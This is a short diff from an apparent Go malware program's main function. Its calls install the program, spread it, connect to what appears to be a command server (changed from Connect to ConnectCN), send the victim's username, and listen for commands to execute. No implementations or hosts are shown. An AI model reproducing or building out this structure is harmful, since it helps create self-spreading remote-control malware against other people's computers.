@@ -21,7 +21,7 @@ func main() {
 	CheckMultiInstances()
 	Install()
 	Spread()
-	c, _ = Connect()
+	c, _ = ConnectCN()
 	go Send("user", GetUsername())
 	go ListenAndExecute()
 
